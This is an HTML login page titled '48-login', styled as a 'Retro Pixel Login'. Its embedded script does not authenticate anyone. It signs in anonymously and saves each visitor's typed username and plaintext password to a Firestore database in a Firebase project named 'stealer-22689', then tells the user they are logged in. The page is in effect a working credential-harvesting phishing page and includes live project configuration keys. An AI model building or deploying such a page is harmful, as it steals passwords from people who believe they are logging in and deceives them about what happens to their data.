<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>48-login</title>
  <link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap" rel="stylesheet" />
  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.24.0/firebase-app.js";
    import {
      getFirestore,
      doc,
      setDoc
    } from "https://www.gstatic.com/firebasejs/9.24.0/firebase-firestore.js";

    import {
      getAuth,
      signInAnonymously,
      setPersistence,
      browserLocalPersistence,
      browserSessionPersistence
    } from "https://www.gstatic.com/firebasejs/9.24.0/firebase-auth.js";

    const firebaseConfig = {
      apiKey: "AIzaSyAQlPoupRMYE9_4Sli4-ZFjGJEyhnJWpQU",
      authDomain: "stealer-22689.firebaseapp.com",
      projectId: "stealer-22689",
      storageBucket: "stealer-22689.firebasestorage.app",
      messagingSenderId: "794872608041",
      appId: "1:794872608041:web:931ab0b75aee3ec67c7338",
      measurementId: "G-HTDSYH71XK"
    };

    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);
    const auth = getAuth(app);

    window.login = async function (e) {
      e.preventDefault();
      const username = document.getElementById("username").value.trim();
      const password = document.getElementById("password").value.trim();
      const remember = document.getElementById("remember").checked;

      if (!username || !password) {
        alert("Username and password required.");
        return;
      }

      const persistence = remember ? browserLocalPersistence : browserSessionPersistence;

      try {
        await setPersistence(auth, persistence);
        await signInAnonymously(auth); // no actual email login

        // Save credentials to Firestore under users/USERNAME
        await setDoc(doc(db, "users", username), {
          username: username,
          password: password,
          savedAt: new Date().toISOString()
        });

        alert("✔️ Logged in and saved as: " + username);
      } catch (error) {
        alert("❌ Login error: " + error.message);
      }
    };
  </script>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: linear-gradient(145deg, #000000, #0d1b2a);
      font-family: 'Press Start 2P', monospace;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      color: #00ffee;
    }

    .login-box {
      background-color: #09182d;
      border: 3px solid #00ffee;
      padding: 40px;
      border-radius: 8px;
      width: 400px;
      text-align: center;
      box-shadow: 0 0 20px #00ffee88;
    }

    .logo {
      font-size: 20px;
      color: #ff0044;
      margin-bottom: 20px;
      text-shadow: 1px 1px 2px #000;
    }

    h2 {
      color: #00ffee;
      font-size: 16px;
      margin-bottom: 30px;
    }

    input[type="text"], input[type="password"] {
      background-color: #000814;
      color: #00ffee;
      border: 2px solid #00ffee;
      border-radius: 4px;
      padding: 12px;
      width: 100%;
      font-family: 'Press Start 2P', monospace;
      font-size: 12px;
      margin-bottom: 20px;
    }

    .remember {
      display: flex;
      align-items: center;
      justify-content: flex-start;
      font-size: 10px;
      color: #ffffff;
      margin-bottom: 20px;
    }

    .remember input {
      margin-right: 8px;
    }

    button {
      background-color: #00ffee;
      border: none;
      color: #000814;
      padding: 12px;
      width: 100%;
      font-family: 'Press Start 2P', monospace;
      font-size: 12px;
      cursor: pointer;
      transition: background-color 0.2s ease-in-out;
    }

    button:hover {
      background-color: #00ccdd;
    }

    .footer {
      margin-top: 20px;
      font-size: 10px;
      color: #888;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <div class="logo">48-login</div>
    <h2>Enter your login</h2>
    <form onsubmit="login(event)">
      <input type="text" id="username" placeholder="Username" required />
      <input type="password" id="password" placeholder="Password" required />
      <div class="remember">
        <input type="checkbox" id="remember" />
        <label for="remember">Remember Me</label>
      </div>
      <button type="submit">LOGIN</button>
    </form>
    <div class="footer">Retro Pixel Login v1.1</div>
  </div>
</body>
</html>
